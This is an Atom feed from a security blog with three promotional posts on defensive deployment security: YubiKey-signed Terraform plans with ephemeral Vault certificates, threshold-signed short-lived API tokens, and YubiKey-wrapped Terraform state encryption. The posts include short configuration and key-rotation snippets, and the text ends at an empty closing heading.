<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator>
  <link href="https://www.securesql.info/feed.xml" rel="self" type="application/atom+xml"/>
  <link href="https://www.securesql.info/" rel="alternate" type="text/html"/>
  <updated>2025-12-18T16:24:58-08:00</updated>
  <id>https://www.securesql.info/feed.xml</id>
  <title type="html">Menerick’s Security Ledger</title>
  <subtitle>Explore cutting-edge cybersecurity insights and protective strategies with John Menerick. Deep dives, threat analysis, and live streams from securesql.info.</subtitle>
  <author>
    <name>John W8MEJ Menerick</name>
  </author>
  <entry>
    <title type="html">5 Mind-Bending Security Paradigms That Will Redefine How You Think About Infrastructure Deployments</title>
    <link href="https://www.securesql.info/2025/12/13/immutable-plan-enforcer/" rel="alternate" type="text/html" title="5 Mind-Bending Security Paradigms That Will Redefine How You Think About Infrastructure Deployments"/>
    <published>2025-12-13T00:00:00-08:00</published>
    <updated>2025-12-13T00:00:00-08:00</updated>
    <id>https://www.securesql.info/2025/12/13/immutable-plan-enforcer</id>
    <content type="html" xml:base="https://www.securesql.info/2025/12/13/immutable-plan-enforcer/"><![CDATA[<p>In the evolving landscape of cloud security, we often talk about “defense in depth” and “zero trust,” but rarely do we see implementations that truly embody these principles at every layer. Most infrastructure deployments still rely on long-lived credentials, implicit trust boundaries, and the hope that our CI/CD pipelines haven’t been compromised.</p>

<p>What if every deployment required physical proof of approval? What if credentials expired within minutes instead of months? What if your infrastructure could verify not just <em>who</em> deployed it, but <em>exactly what</em> was deployed—down to the cryptographic fingerprint?</p>

<p>This isn’t theoretical. This architecture exists, and it challenges everything we thought we knew about secure infrastructure deployment.</p>

<hr />

<h2 id="1-hardware-bound-deployments-your-yubikey-becomes-your-deployment-authority"><strong>1. Hardware-Bound Deployments: Your YubiKey Becomes Your Deployment Authority</strong></h2>

<p>The most striking innovation here is the assertion that <strong>no Terraform plan should exist unsigned—ever</strong>. Not in your CI/CD pipeline. Not in your artifact storage. Nowhere.</p>

<blockquote>
  <p>“Every Terraform plan is signed with a <strong>YubiKey PIV certificate</strong> — unsigned plans never exist in storage.”</p>
</blockquote>

<p>Think about the implications. In traditional workflows, we sign container images after they’re built. We sign Git commits after they’re written. But here, the infrastructure changes themselves are cryptographically bound to a physical hardware token <em>before they’re even stored</em>.</p>

<p><strong>Why this matters:</strong> Compromising the deployment pipeline no longer grants an attacker the ability to deploy. They would need physical access to the YubiKey and knowledge of its PIN. This transforms infrastructure deployment from a “what you know” problem (credentials, tokens) to a “what you have” problem (physical hardware).</p>

<p>The elegance is in the inversion: instead of protecting the deployment pipeline, the pipeline becomes irrelevant without the hardware key. The YubiKey PIV slot becomes the root of trust, and everything flows from there.</p>

<hr />

<h2 id="2-ephemeral-certificates-that-auto-revoke-10-minute-credentials-for-each-deployment"><strong>2. Ephemeral Certificates That Auto-Revoke: 10-Minute Credentials for Each Deployment</strong></h2>

<p>We live in a world where TLS certificates are valid for 90 days, sometimes a year. We’ve normalized credential lifespans measured in months. This architecture obliterates that paradigm.</p>

<blockquote>
  <p>“Vault PKI issues a <strong>single-use TLS cert</strong> for each OCI Function deployment — auto-revoked after update.”</p>
</blockquote>

<p>Every function deployment receives a certificate with a 10-minute TTL, issued by HashiCorp Vault’s PKI engine. Once the deployment updates, the certificate is immediately revoked. This isn’t credential rotation—it’s credential <em>evaporation</em>.</p>

<p><strong>The counter-intuitive insight:</strong> The shorter the credential lifetime, the simpler your security model becomes. No rotation schedules. No certificate renewal logic. No “what happens when the cert expires mid-deployment” edge cases. The credential exists only long enough to prove the deployment’s validity, then vanishes.</p>

<p>This approach transforms how we think about credential management. Instead of asking “how do we protect long-lived credentials,” we ask “why do credentials need to exist longer than the operation they authorize?”</p>

<hr />

<h2 id="3-fingerprint-bound-function-execution-code-that-refuses-to-run-without-proof"><strong>3. Fingerprint-Bound Function Execution: Code That Refuses to Run Without Proof</strong></h2>

<p>Here’s where it gets truly fascinating. The OCI Function doesn’t just check credentials—it validates that the deployment fingerprint matches the certificate fingerprint embedded during deployment.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># From handler.py
</span><span class="n">cert_fingerprint_hex</span> <span class="o">=</span> <span class="n">cert</span><span class="p">.</span><span class="n">serial_number</span><span class="p">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"big"</span><span class="p">).</span><span class="nb">hex</span><span class="p">()</span>

<span class="k">if</span> <span class="n">plan_fingerprint</span> <span class="o">!=</span> <span class="n">cert_fingerprint_hex</span><span class="p">:</span>
    <span class="k">raise</span> <span class="nb">Exception</span><span class="p">(</span><span class="s">"Plan fingerprint mismatch – unauthorized deployment"</span><span class="p">)</span>
</code></pre></div></div>

<p>The function <strong>refuses to execute</strong> unless the <code class="language-plaintext highlighter-rouge">X-Plan-Fingerprint</code> header matches the certificate’s binding. This creates an immutable audit chain: YubiKey signature → Terraform plan → Vault certificate → Function runtime.</p>

<p><strong>The paradigm shift:</strong> Traditional security asks “is this caller authorized?” This system asks “is this <em>exact deployment</em> authorized?” A compromised function invocation endpoint can’t be used to run arbitrary code—it can only run the code that was YubiKey-approved.</p>

<p>This is infrastructure immutability taken to its logical extreme. You’re not just preventing unauthorized changes; you’re cryptographically ensuring that only the precise, signed changes can execute.</p>

<hr />

<h2 id="4-the-vault-approle-architecture-trust-delegation-without-credential-leakage"><strong>4. The Vault AppRole Architecture: Trust Delegation Without Credential Leakage</strong></h2>

<p>The use of HashiCorp Vault’s AppRole authentication for Terraform deserves special attention. Many organizations struggle with how to authenticate Terraform in CI/CD pipelines without exposing cloud credentials.</p>

<p>This implementation uses Vault as an authentication broker:</p>
<ul>
  <li>Terraform authenticates to Vault using AppRole (role ID + secret ID)</li>
  <li>Vault issues short-lived TLS certificates bound to deployment fingerprints</li>
  <li>Functions validate those certificates at runtime</li>
</ul>

<p><strong>The breakthrough:</strong> Vault becomes the single source of truth for “what deployments are authorized,” while the YubiKey remains the source of truth for “who authorized this deployment.” The separation of concerns is elegant—authentication, authorization, and cryptographic proof are distinct layers that reinforce each other.</p>

<p>You’re not storing cloud credentials in CI/CD. You’re not rotating API keys. You’re requesting just-in-time proof of authorization from a central authority, bound to a hardware-signed artifact.</p>

<hr />

<h2 id="5-the-tamper-test-success-criterion-security-through-mathematical-certainty"><strong>5. The Tamper-Test Success Criterion: Security Through Mathematical Certainty</strong></h2>

<p>The README includes a success criterion that seems almost dismissive in its simplicity:</p>

<blockquote>
  <p>“Tamper test: Modify plan → signature fails → Function rejects”</p>
</blockquote>

<p>But this single line encapsulates the entire security model. If you change even one byte in the Terraform plan, the signature verification fails. No signature, no deployment. No exceptions. No override flags. No emergency break-glass procedures.</p>

<p><strong>The philosophical shift:</strong> Most security systems operate on probabilistic detection—we <em>try</em> to catch tampering through alerts, monitoring, and anomaly detection. This system makes tampering mathematically impossible to hide. You can modify the plan, but you can’t make the function accept it without the YubiKey.</p>

<p>This represents a move from detective controls (we’ll notice if something’s wrong) to preventive controls (wrong things simply cannot happen). The system doesn’t detect unauthorized deployments—it makes them impossible.</p>

<hr />

<h2 id="the-future-of-deployment-security"><strong>The Future of Deployment Security</strong></h2>

<p>This architecture forces us to confront uncomfortable questions:</p>

<ul>
  <li>If we can bind deployments to hardware tokens, why don’t we?</li>
  <li>If certificates can be valid for 10 minutes, why are we issuing them for 90 days?</li>
  <li>If we can cryptographically prove <em>exactly what</em> was deployed, why do we settle for proving <em>who</em> deployed it?</li>
</ul>

<p>The most powerful aspect of this implementation isn’t any single technical component—it’s the holistic rethinking of what “secure deployment” means. It moves us from “securing the pipeline” to “making the pipeline irrelevant without hardware proof.”</p>

<p><strong>The question we should be asking:</strong> If an attacker gained full access to your CI/CD pipeline tomorrow, could they deploy unauthorized infrastructure? In most organizations, the answer is yes. In this architecture, the answer is mathematically no.</p>

<hr />

<h2 id="ready-to-see-it-in-action"><strong>Ready to See It in Action?</strong></h2>

<p>This isn’t a thought experiment or a research paper. It’s proof-of-concept-ready code, fully documented, with clear success criteria and implementation steps. If you’re serious about zero-trust infrastructure, hardware-bound deployments, and ephemeral credential architectures, exploring this repository will change how you think about security.</p>

<p><strong>Explore the implementation:</strong> <a href="https://github.com/w8mej/Immutable-Plan-Enforcer">Immutable-Plan-Enforcer on GitHub</a></p>

<p>The code is there. The patterns are there. The only question is: are you ready to rethink how deployment security should work?</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Zero Trust Architecture"/>
    <category term="Hardware Security Modules"/>
    <category term="Ephemeral Credentials"/>
    <category term="Infrastructure as Code"/>
    <category term="YubiKey Security"/>
    <category term="HashiCorp Vault"/>
    <category term="Cloud Security"/>
    <category term="DevSecOps"/>
    <category term="Immutable Infrastructure"/>
    <category term="Certificate-Based Authentication"/>
    <summary type="html"><![CDATA[We assume signed code happens in CI/CD pipelines. We assume certificates live for days or weeks. We assume trust is verified once at build time. Every single one of these assumptions is obsolete—and this implementation proves why.]]></summary>
  </entry>
  <entry>
    <title type="html">5 Mind-Bending Truths About API Security That Will Change How You Think About Trust</title>
    <link href="https://www.securesql.info/2025/12/12/zero-trust-api-key-minting/" rel="alternate" type="text/html" title="5 Mind-Bending Truths About API Security That Will Change How You Think About Trust"/>
    <published>2025-12-12T00:00:00-08:00</published>
    <updated>2025-12-12T00:00:00-08:00</updated>
    <id>https://www.securesql.info/2025/12/12/zero-trust-api-key-minting</id>
    <content type="html" xml:base="https://www.securesql.info/2025/12/12/zero-trust-api-key-minting/"><![CDATA[<p>Here’s a question that keeps security engineers up at night: How do you give developers the velocity they need without handing them the keys to the kingdom?</p>

<p>For decades, we’ve been stuck in a brutal tradeoff. Either we create long-lived API keys that developers can use freely (and inevitably leak in Git repos, Slack messages, or compromised CI/CD systems), or we bottleneck every credential request through a security team that becomes the organizational Department of No.</p>

<p>But what if there’s a third way? What if we could architect a system where credentials are born expired, where no single entity can mint them alone, and where hardware itself becomes the guardian of trust?</p>

<p>Welcome to the future of API security—and it’s wilder than you think.</p>

<hr />

<h2 id="1-the-most-secure-key-is-one-that-self-destructs-in-15-minutes"><strong>1. The Most Secure Key Is One That Self-Destructs in 15 Minutes</strong></h2>

<p>Think about traditional API keys for a moment. They’re like giving someone a master key to your house that works forever, hoping they’ll be responsible with it. Spoiler alert: they won’t be.</p>

<p>The Zero-Trust API Key Minting system flips this entire model on its head. Every single token has a default lifespan of just <strong>900 seconds</strong>—fifteen minutes. After that? Dead. Useless. A cryptographic pumpkin at midnight.</p>

<blockquote>
  <p>“Engineers self-mint <strong>short-lived, scoped</strong> JWTs signed by a rooted key via multiparty computation that is <strong>threshold-protected by YubiKey/HSM guardians</strong>. No human bottlenecks, no long-lived secrets.”</p>
</blockquote>

<p>Why is this so powerful? Because even if an attacker intercepts your credential, steals it from memory, or finds it in a log file, they have a vanishingly small window to use it. And that’s before we even talk about scoping—these tokens aren’t skeleton keys. They’re laser-focused on specific operations like <code class="language-plaintext highlighter-rouge">read:logs</code> or <code class="language-plaintext highlighter-rouge">deploy:canary</code>.</p>

<p>The brilliance here isn’t just technical; it’s philosophical. By making credentials ephemeral by default, we fundamentally change the risk calculus. The question shifts from “How do we prevent credential leaks?” to “How do we make leaked credentials useless?”</p>

<hr />

<h2 id="2-no-single-human-or-machine-can-create-these-keys-alone"><strong>2. No Single Human (Or Machine) Can Create These Keys Alone</strong></h2>

<p>Here’s where things get truly fascinating. In this architecture, <strong>no single entity has enough power to mint a token</strong>.</p>

<p>Traditional systems have a root signing key sitting somewhere—in a vault, an HSM, a KMS. If you compromise that one thing, game over. But this system uses something called <strong>FROST (Flexible Round-Optimized Schnorr Threshold signatures)</strong> with Ed25519.</p>

<p>In plain English? The signing authority is split across multiple guardians (think: YubiKeys or HSMs carried by different senior engineers), and you need a threshold quorum—say 2 out of 3—to sign anything. The key shares <strong>never leave the hardware</strong>, and the signature is generated through multiparty computation.</p>

<blockquote>
  <p>“Threshold Signing (t-of-n) – Signing authority split across multiple guardians; no single entity holds the complete key.”</p>
</blockquote>

<p>This is cryptographic separation of powers. Even if an attacker compromises one signer, they can’t do anything. They’d need to simultaneously compromise multiple YubiKeys held by different people (good luck with that), or breach multiple confidential computing enclaves running in separate availability zones.</p>

<p>The philosophical shift? <strong>Trust isn’t placed in a person or a machine. It’s distributed across a protocol.</strong></p>

<hr />

<h2 id="3-hardware-itself-becomes-the-ultimate-guardian"><strong>3. Hardware Itself Becomes the Ultimate Guardian</strong></h2>

<p>Let’s talk about the unsung hero of this architecture: the YubiKey.</p>

<p>Most people think of YubiKeys as two-factor authentication tokens—little USB dongles you tap to log in. But in this system, they’re far more powerful. They hold <strong>cryptographic key shares</strong> that never leave the secure element on the device. When it’s time to sign a token, the computation happens <strong>inside the hardware</strong>, and only the partial signature comes out.</p>

<p>The system goes even further with <strong>OCI Confidential Compute</strong> using AMD SEV-SNP (Secure Encrypted Virtualization with Secure Nested Paging). These aren’t just virtual machines—they’re cryptographically attested hardware enclaves where even the cloud provider can’t peek inside.</p>

<blockquote>
  <p>“YubiKey / HSM Integration – Private key shares never leave hardware; signatures generated in secure hardware.”</p>
</blockquote>

<p>Why does this matter? Because software is soft. It can be debugged, dumped, reverse-engineered. But hardware security modules and trusted execution environments are designed to resist even physical attacks. When you combine YubiKeys + HSMs + confidential VMs + threshold signatures, you create a fortress where the crown jewels—the signing authority—literally cannot be extracted.</p>

<p>This is defense in depth at the silicon level.</p>

<hr />

<h2 id="4-policy-is-code-and-code-doesnt-get-tired-at-2-am"><strong>4. Policy Is Code, And Code Doesn’t Get Tired at 2 AM</strong></h2>

<p>Human security reviews don’t scale. They’re slow, inconsistent, and vulnerable to fatigue. What if you’re trying to ship a critical hotfix at 2 AM? The security engineer on call might approve something they’d question during daylight hours.</p>

<p>This system automates authorization using <strong>Open Policy Agent (OPA)</strong> with Rego policies. Every mint request gets evaluated against a policy bundle that asks:</p>

<ul>
  <li>Is this scope allowed for this user’s role?</li>
  <li>Is the requested TTL within acceptable limits?</li>
  <li>Does the WebAuthn assertion check out?</li>
  <li>Is the SEV-SNP attestation valid?</li>
  <li>Did OCI KMS co-sign this request with a valid receipt?</li>
</ul>

<p>All of these checks happen in <strong>milliseconds</strong>, programmatically, with zero human intervention.</p>

<blockquote>
  <p>“OPA Policy Enforcement – Scopes, TTLs, and role-based access controlled via JSON (<code class="language-plaintext highlighter-rouge">policy.json</code>) or fine-grained Rego policies.”</p>
</blockquote>

<p>The policy is versioned, CI-tested, and deployed like any other code. You can A/B test authorization rules. You can roll back if something breaks. You can audit every decision with perfect fidelity.</p>

<p>This is what “shift left” really means—not just testing earlier, but <strong>making security decisions at machine speed with machine consistency</strong>.</p>

<hr />

<h2 id="5-this-entire-system-is-designed-to-be-untrustworthy"><strong>5. This Entire System Is Designed to Be Untrustworthy</strong></h2>

<p>Here’s the most counter-intuitive part: the creators of this system actively assume <strong>everything will be compromised</strong>.</p>

<p>Read that again. This isn’t defense in depth as a nice-to-have. It’s paranoia as an architectural principle.</p>

<ul>
  <li>Containers run as non-root with <strong>read-only filesystems</strong> and all capabilities dropped</li>
  <li>Services communicate over <strong>mutual TLS</strong> with certificates that auto-rotate</li>
  <li>Network policies enforce east-west traffic restrictions—signers can <em>only</em> talk to the coordinator</li>
  <li>Every mint generates an <strong>append-only, hash-chained audit log</strong> stored in WORM (Write Once Read Many) object storage</li>
  <li>SEV-SNP attestation binds the policy hash to the measured launch digest of the VM</li>
</ul>

<p>The design document even has a section called “Replacing PoC Bits for Production” that basically says: <em>“Hey, we know you shouldn’t trust this as-is. Here’s what you need to harden.”</em></p>

<p>This is <strong>zero-trust internalized</strong>. The system doesn’t trust the network. It doesn’t trust the VMs. It barely trusts itself.</p>

<p>And because of that radical distrust, it becomes genuinely trustworthy.</p>

<hr />

<h2 id="so-what-does-this-all-mean"><strong>So What Does This All Mean?</strong></h2>

<p>We’re witnessing a fundamental shift in how we think about credentials and authorization. The old model—long-lived secrets guarded by process and policy—is dying. In its place: ephemeral, hardware-backed, cryptographically distributed authority that operates at the speed of code.</p>

<p>This isn’t just about API keys. It’s a blueprint for rethinking trust itself in distributed systems.</p>

<p>The engineers who build systems like this aren’t just solving a technical problem. They’re asking a deeper question: <strong>What would security look like if we designed it from first principles, assuming every layer will eventually fail?</strong></p>

<p>And the answer is beautiful in its paranoia.</p>

<hr />

<p><strong>Want to see how deep this rabbit hole goes?</strong> Dive into the full implementation, FROST threshold signature code, OPA policies, and Kubernetes manifests in the <a href="https://github.com/w8mej/zero-trust-given">Zero-Trust API Key Minting repository</a>. Fair warning: it’s a proof of concept, not proof-of-concept-ready. But the ideas inside might just change how you architect your next secure service.</p>

<p><strong>Now ask yourself:</strong> If your current API keys were leaked tomorrow on Pastebin, how long would it take before someone noticed? And what would they be able to do in that time?</p>

<p>With a fifteen-minute window and hardware-guarded threshold signatures, the answer becomes a lot less terrifying.</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Zero Trust"/>
    <category term="API Security"/>
    <category term="Cryptographic MPC"/>
    <category term="Hardware Security"/>
    <category term="Short-Lived Credentials"/>
    <category term="FROST Threshold Signatures"/>
    <category term="YubiKey"/>
    <category term="DevSecOps"/>
    <category term="Policy as Code"/>
    <category term="Confidential Computing"/>
    <summary type="html"><![CDATA[We've been thinking about API keys completely wrong. What if the most secure credential is one that literally can't exist for more than fifteen minutes—and requires a committee of hardware tokens to even create?]]></summary>
  </entry>
  <entry>
    <title type="html">The Security Pattern Most DevOps Teams Get Dangerously Wrong (And How Hardware Tokens Fix It)</title>
    <link href="https://www.securesql.info/2025/12/11/yubikey-terraform-state-guard/" rel="alternate" type="text/html" title="The Security Pattern Most DevOps Teams Get Dangerously Wrong (And How Hardware Tokens Fix It)"/>
    <published>2025-12-11T00:00:00-08:00</published>
    <updated>2025-12-11T00:00:00-08:00</updated>
    <id>https://www.securesql.info/2025/12/11/yubikey-terraform-state-guard</id>
    <content type="html" xml:base="https://www.securesql.info/2025/12/11/yubikey-terraform-state-guard/"><![CDATA[<p>Your Terraform state file is probably one of the most sensitive files in your entire infrastructure. It contains everything: database passwords, API keys, service account credentials, private SSL certificates, even the secret tokens that protect your other secrets.</p>

<p>And yet, most teams treat it like any other configuration file.</p>

<p>They store it in S3 with server-side encryption (SSE-KMS), pat themselves on the back for enabling “encryption at rest,” and move on. But here’s the uncomfortable truth: <strong>AWS controls those keys, not you.</strong> A sufficiently motivated attacker with AWS access, a compromised IAM role, or even a rogue insider can decrypt your state file without breaking a sweat.</p>

<p>What if there was a way to make state encryption truly unbreakable—where the private key physically cannot leave a piece of hardware, where key rotation happens automatically after every deploy, and where even a full AWS compromise wouldn’t expose your secrets?</p>

<p>Enter the world of hardware-root-of-trust encryption for Terraform.</p>

<h2 id="the-problem-your-encrypted-state-isnt-as-safe-as-you-think"><strong>The Problem: Your “Encrypted” State Isn’t as Safe as You Think</strong></h2>

<p>Most teams enable encryption on their Terraform state with a single line in their backend configuration:</p>

<div class="language-hcl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">encrypt</span> <span class="err">=</span> <span class="kc">true</span>
<span class="nx">kms_key_id</span> <span class="err">=</span> <span class="s2">"arn:aws:kms:..."</span>
</code></pre></div></div>

<p>Mission accomplished, right? Not quite.</p>

<p>Here’s what actually happens: AWS encrypts your state file with a key that AWS manages. You don’t control the key material. You don’t control when it’s used. You’re trusting AWS (and anyone with sufficient IAM permissions) to protect that key. If an attacker compromises your AWS account—through a leaked access key, a misconfigured IAM policy, or a supply chain attack—they can decrypt your state file just as easily as you can.</p>

<blockquote>
  <p><strong>“Private RSA key never leaves hardware; attacker must possess the physical YubiKey.”</strong></p>
</blockquote>

<p>This isn’t theoretical paranoia. The <a href="https://circleci.com/blog/january-4-2023-security-alert/">2023 CircleCI breach</a> exposed thousands of secrets because attackers gained access to an employee’s session cookie, which gave them access to production systems. In the <a href="https://www.uber.com/newsroom/security-update/">Uber breach of 2022</a>, an attacker used social engineering to access an admin console and then pivoted to read secrets from other systems.</p>

<p><strong>The insight:</strong> True encryption means <em>you</em> control the key material, not your cloud provider. And the only way to guarantee that is hardware.</p>

<hr />

<h2 id="the-counter-intuitive-solution-your-50-usb-key-is-stronger-than-your-100000-cloud-hsm"><strong>The Counter-Intuitive Solution: Your $50 USB Key Is Stronger Than Your $100,000 Cloud HSM</strong></h2>

<p>When you think “hardware security,” you probably picture expensive Hardware Security Modules (HSMs) sitting in climate-controlled data centers, costing hundreds of thousands of dollars.</p>

<p>But here’s the surprising truth: <strong>a $50 YubiKey provides the same fundamental guarantee</strong> that a six-figure CloudHSM does—the private key material physically cannot leave the device.</p>

<p>The magic is in the YubiKey’s PIV (Personal Identity Verification) smart card. When you generate an RSA key on the YubiKey (slot <code class="language-plaintext highlighter-rouge">9c</code> in this implementation), the private key is created <em>inside</em> the hardware and never exposed to the operating system, memory, or any process. Ever. Cryptographic operations happen inside the token, and only the <em>results</em> come out.</p>

<blockquote>
  <p><strong>“Full control over keys; meets compliance for customer-managed encryption.”</strong></p>
</blockquote>

<p>This means an attacker would need:</p>
<ol>
  <li>Physical possession of the YubiKey</li>
  <li>The YubiKey’s PIN</li>
  <li>Access to the wrapped key material in Vault</li>
</ol>

<p>Compare that to SSE-KMS, where an attacker needs:</p>
<ol>
  <li>AWS credentials with sufficient permissions (easily leaked, phished, or misconfigured)</li>
</ol>

<p>The difference is staggering. And the cost difference? Also staggering—in the opposite direction.</p>

<p><strong>The insight:</strong> Hardware root-of-trust isn’t expensive anymore. The $50 YubiKey in your pocket provides stronger guarantees than most enterprise security architectures.</p>

<hr />

<h2 id="the-elegant-pattern-wrap-dont-store-unwrap-dont-expose"><strong>The Elegant Pattern: Wrap Don’t Store, Unwrap Don’t Expose</strong></h2>

<p>The architecture here is beautifully simple:</p>

<ol>
  <li><strong>Generate</strong> a random AES-256 key (this encrypts your Terraform state)</li>
  <li><strong>Wrap</strong> that key with the YubiKey’s public RSA key</li>
  <li><strong>Store</strong> only the wrapped key in Vault (useless without the YubiKey)</li>
  <li><strong>Unwrap</strong> the key with the YubiKey when needed (happens in hardware)</li>
  <li><strong>Rotate</strong> the key after every Terraform apply</li>
</ol>

<p>The wrapped key can live in Vault’s KV store, it can be committed to Git, it could be published on a billboard in Times Square—it doesn’t matter. Without the physical YubiKey, the wrapped key is cryptographically worthless.</p>

<p>Here’s the actual workflow in practice:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Retrieve wrapped key from Vault</span>
<span class="nv">WRAPPED</span><span class="o">=</span><span class="si">$(</span>vault kv get <span class="nt">-field</span><span class="o">=</span>data kv/terraform/state | jq <span class="nt">-r</span> .key<span class="si">)</span>

<span class="c"># Unwrap with YubiKey (decryption happens IN the hardware)</span>
<span class="nv">SEED</span><span class="o">=</span><span class="si">$(</span>yubico-piv-tool <span class="nt">-a</span> decrypt <span class="nt">-s</span> 9c <span class="nt">-i</span> wrapped.bin<span class="si">)</span>

<span class="c"># Use unwrapped key for Terraform operations</span>
terraform apply
</code></pre></div></div>

<p>Notice what’s <em>not</em> happening: the private key is never extracted, never cached, never written to disk. It exists only inside the YubiKey.</p>

<p><strong>The insight:</strong> Security isn’t about hiding keys better—it’s about making sure keys <em>physically cannot be stolen</em> in the first place.</p>

<hr />

<h2 id="the-rotation-revolution-every-deploy-gets-a-fresh-key"><strong>The Rotation Revolution: Every Deploy Gets a Fresh Key</strong></h2>

<p>Most teams treat key rotation like dental visits—they know they should do it more often, but it’s painful and easy to postpone.</p>

<p>This implementation makes rotation automatic. After every <code class="language-plaintext highlighter-rouge">terraform apply</code>, a fresh AES key is generated, wrapped with the YubiKey, and stored in Vault:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>terraform apply <span class="nt">-auto-approve</span> <span class="o">&amp;&amp;</span> ./rotate-key.sh
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">rotate-key.sh</code> script is delightfully simple:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Generate new seed</span>
<span class="nv">NEW_SEED</span><span class="o">=</span><span class="si">$(</span>openssl rand <span class="nt">-base64</span> 32<span class="si">)</span>

<span class="c"># Wrap with YubiKey</span>
<span class="nv">WRAPPED_NEW</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"</span><span class="nv">$NEW_SEED</span><span class="s2">"</span> | 
  yubico-piv-tool <span class="nt">-a</span> encrypt <span class="nt">-s</span> 9c <span class="nt">-i</span> - | <span class="nb">base64</span><span class="si">)</span>

<span class="c"># Store in Vault</span>
vault kv put kv/terraform/state <span class="nv">key</span><span class="o">=</span><span class="nv">$WRAPPED_NEW</span>
</code></pre></div></div>

<blockquote>
  <p><strong>“Automated rotation — limits exposure; each state version uses a unique key.”</strong></p>
</blockquote>

<p>Why does this matter? Because even if an attacker somehow retrieves your current state file (from an S3 bucket snapshot, a backup tape, a leaked CI/CD log), they can’t decrypt <em>previous</em> state versions. Each version is protected by a different key, and all those keys require the YubiKey to unwrap.</p>

<p><strong>The insight:</strong> When rotation is automated and effortless, it transforms from a compliance checkbox into a real security layer. Blast radius of any single key compromise: exactly one state version.</p>

<hr />

<h2 id="the-compliance-shortcut-customer-managed-encryption-becomes-trivially-true"><strong>The Compliance Shortcut: “Customer-Managed Encryption” Becomes Trivially True</strong></h2>

<p>If you’ve ever dealt with compliance frameworks—SOC 2, ISO 27001, HIPAA, PCI DSS—you’ve probably encountered the requirement for “customer-managed encryption keys.”</p>

<p>With AWS KMS, you can claim this is true… sort of. You manage the <em>access policies</em>, but AWS still manages the actual key material. Auditors who understand cryptography might push back on this.</p>

<p>With YubiKey-wrapped keys, the answer is definitively yes:</p>

<ul>
  <li><strong>You</strong> generate the key material (inside your hardware token)</li>
  <li><strong>You</strong> control when and how it’s used (physical possession)</li>
  <li><strong>You</strong> control the key lifecycle (rotation scripts you own)</li>
</ul>

<p>The private key material has never touched AWS, never touched HashiCorp’s infrastructure, never touched any third-party system. It was created in your YubiKey and will die in your YubiKey.</p>

<p>From a Terraform backend perspective:</p>

<div class="language-hcl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">terraform</span> <span class="p">{</span>
  <span class="nx">backend</span> <span class="s2">"s3"</span> <span class="p">{</span>
    <span class="nx">bucket</span>  <span class="p">=</span> <span class="s2">"my-terraform-state"</span>
    <span class="nx">key</span>     <span class="p">=</span> <span class="s2">"prod/terraform.tfstate"</span>
    <span class="nx">region</span>  <span class="p">=</span> <span class="s2">"us-east-1"</span>
    <span class="nx">encrypt</span> <span class="p">=</span> <span class="kc">false</span>  <span class="c1"># We handle encryption ourselves</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Notice <code class="language-plaintext highlighter-rouge">encrypt = false</code>. You’re not trusting S3’s encryption—you’re encrypting the state file yourself before it ever touches S3.</p>

<p><strong>The insight:</strong> True customer-managed encryption isn’t a bureaucratic box to check—it’s a fundamental shift in where trust boundaries live.</p>

<hr />

<h2 id="the-surprising-simplicity-enterprise-security-with-shell-scripts"><strong>The Surprising Simplicity: Enterprise Security with Shell Scripts</strong></h2>

<p>Perhaps the most counter-intuitive insight is how <em>simple</em> this all is.</p>

<p>No Lambda functions with complex IAM roles. No CloudHSM with arcane configuration. No expensive enterprise secret management SaaS. Just:</p>

<ul>
  <li>A $50 YubiKey</li>
  <li>Vault (which you’re probably already running)</li>
  <li>Two shell scripts (combined total: ~60 lines of bash)</li>
  <li>Standard OpenSSL tools</li>
</ul>

<p>The entire <code class="language-plaintext highlighter-rouge">tf-wrapper.sh</code> that handles key unwrapping and Terraform execution is 34 lines. The key rotation script is 25 lines. That’s it.</p>

<p>This isn’t a criticism of enterprise security tools—they have their place. But it’s a reminder that <strong>security fundamentals haven’t changed</strong>. Good cryptography, proper key separation, and hardware boundaries are more powerful than any amount of complexity.</p>

<blockquote>
  <p><strong>“Terraform-driven key rotation integrated into normal apply workflow.”</strong></p>
</blockquote>

<p>The beauty is in the integration: your developers don’t need to change their workflow. They still run <code class="language-plaintext highlighter-rouge">terraform apply</code>. The security happens transparently in the wrapper script.</p>

<p><strong>The insight:</strong> The most powerful security patterns are often the simplest. Complexity is often a sign you’re solving the wrong problem.</p>

<hr />

<h2 id="the-future-question-what-happens-when-the-yubikey-breaks"><strong>The Future Question: What Happens When the YubiKey Breaks?</strong></h2>

<p>Here’s the thought-provoking reality that every implementation of hardware-backed encryption must confront:</p>

<p><strong>If you lose the YubiKey, you lose access to your Terraform state. Forever.</strong></p>

<p>This isn’t a bug—it’s the feature. The whole point is that the private key cannot be extracted, cannot be backed up, cannot be recovered. That’s what makes it secure.</p>

<p>So how do you handle business continuity?</p>

<p>This implementation suggests a few paths:</p>
<ol>
  <li><strong>Key escrow</strong>: Generate a backup keypair, split it with Shamir’s Secret Sharing, distribute to trusted parties</li>
  <li><strong>Multi-signature</strong>: Require 2-of-3 YubiKeys to unwrap (any two can proceed if one is lost)</li>
  <li><strong>Separate recovery key</strong>: Store a recovery private key in an offline vault, use only in emergencies</li>
</ol>

<p>Each approach has tradeoffs between security and availability. The question isn’t “which is correct”—it’s “which threat model matters more to your organization?”</p>

<p>But here’s the real question we should all be asking:</p>

<p><strong>If losing a $50 piece of hardware would break your entire infrastructure, what does that say about the fragility of our current security models that rely on easily-copied digital keys?</strong></p>

<p>Maybe the brittleness of hardware tokens isn’t a weakness—it’s a feature that forces us to build truly resilient systems.</p>

<hr />

<h2 id="your-move"><strong>Your Move</strong></h2>

